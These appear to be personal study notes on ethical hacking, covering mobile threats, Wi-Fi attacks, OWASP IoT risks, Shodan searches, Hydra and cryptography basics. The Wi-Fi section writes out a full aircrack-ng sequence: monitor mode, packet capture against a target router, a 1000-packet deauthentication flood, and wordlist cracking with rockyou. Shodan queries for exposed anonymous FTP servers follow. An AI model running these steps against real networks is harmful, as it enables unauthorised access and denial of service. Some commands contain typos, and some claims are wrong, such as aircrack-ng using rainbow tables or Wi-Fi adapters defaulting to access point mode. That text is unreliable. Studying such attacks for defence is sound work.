POC or precautions for mobile hacking : 
regualrly check installed apps
SEP mobile - symantec 
Incognito app : for spyware detection
norton mobile security and antivirus
glasswire data usage monitor


Juice jacking : 
Has happened in top 7 airports in india
hardware hacking in the frree charging ports present in public cases which gives hacker the access to the device


Hacking wireless networks : 

wifi routers :
attacker can manipulate other devices in the network if he can tak control over router
 
Rouge attack :
same hotspot name and performs kind of DOS attacks
Evil twin attack : 
same hotspot name and capture the data packets

Password cracking techniques:
Default passwords
Brute forcing
Password Guessing
Rainbow table attack :
	The password are hashed in wifi networks
In this technique hacker creates a list of hashed password and comapres withhem the stolen hashed passwords from the databases

kali linux tools used :
airmon-ng
airodump-ng
aireplay-ng
aircrack-ng

By default wifi adapters will be in access point mode(receiving)
the attacker needs to chnage it to monitor mode to get info abt the wireless networks

airmon-ng : AP mode to montor mode
airodump-ng : dumps wireless datapackets
aireplay-ng:perforsm DOS attack to make the devices to get disconnected from the network forcibly
aircrack-ng:uses to decrypt the files and to get the plain text of password using rainbow table attack

inbuilt kali linux password file in the path
/usr/share/wordlists/rockyou.txt.gz

to unzipx use gunszip 
gunzip /usr/share/wordlists/rockyou.txt.gz

To kill the networking manager
airmon-ng check kill

airmon-ng start wlan0

airodump-ng wlan0mon
airodump-ng --bssid <macaddr> -c <channelno> -w EUI wlan0mon
in another terminal :
aireplay-ng -a <router bssid> -c 11 --deauth 1000 wlanmon

new terminal :
aircrak-ng -b <target bssid> -w /usr/share/wordlists/rockyou.txt EUI-01.cap

service network-manager start
service networking start

Part 2
Counter measures for the wifi password cracking attack:

Diable the WPS feature in your router.
After the work is done, forget the wifi network
Pineapple router : used by attackers to find all the available networks in a range
Enable MAC address Filtering in your routers
make router into hidden mode
Reset your router monthly once
Change the wifi password frequently

Rlogin : Remote login services

IOT Hacking :

OWASP has given top 10 IOT vulns:

1.weak guessable or hardcoded passwords
2.insecure network services
3.insecure Ecosytem interfaces
4.Lack of secure Update mechanism
5.use of insecure or outdated Components
6.Insufficient privacy protection
7.insecure data transfer and storage
8.lack of device mangement
9.insecure default settings
10.lack of physical hardening
-------------------------------------------------------------------------------------------
Part 3

Shodan is used to find the IOT devices with vulns
Iot devices can be found out using the CVE vuln number
***ASN : Autonomous System number : like a pincode for internet addressess
A range of ip addresses are maintained in the ASN number and given to the isp providers
AS12874

ASN number is used to find the location of an attacker if he is not using a good VPN

Shodan can be used to find vulns for a product databses like:
MySQL
postgresql etc....

Use the shodan queries and can get info abt the vulns from shodan
EX : product:MySQL

we can info based on OS,country,versions, and diff categories

**WE can find FTP servers which have anonymous logins

Search query in shodan :

'anonymous@' login ok
Anonymous user logged in
Only anonymous FTP is allowed here
Anonymous access granted, restrictions apply
230 Login successful


in kali linux:
ftp <target ip addr>


Hydra : kali linux password bruteforcing
hydra -h

it is used to break passwords using brute force attacks


Cryptography:
Cipher text

Types :
1.Symmetric : same key is used for e and d
2.Asymmetric : diff key for e and d public and pprivate key
	 GAK key : Govt accessed to keys


CRYPTOGRAPHICAL ENCRYPTION ALGORITHMS:
1. CIPHERS
2. SUBSTITUTIONS
3.
4. KEYS
5. DES ALGORITHM
6. AES ALGORITHM
7. RC4, RC5,RC6
8. RSA(RIVEST SHAMIR ADLEMAN)
POLYALPHABETICS

CRYPTOGRAPHICAL HASHING ALGORITHMS:
1. MD, MD4,MD5 (MESSAGE DIGEST)
2. SHA (SECURE HASH ALGORITHM)
SHA-1
SHA-2
SHA-256
SHA-512


Hashing algo :
once a text is hashed it cannot be rehashed 
it is used to identify integrity
if changes during transmission are performed the hash value will be effected and then the integrity is compromised

hasing done in two diff platforms will result in the same hash value
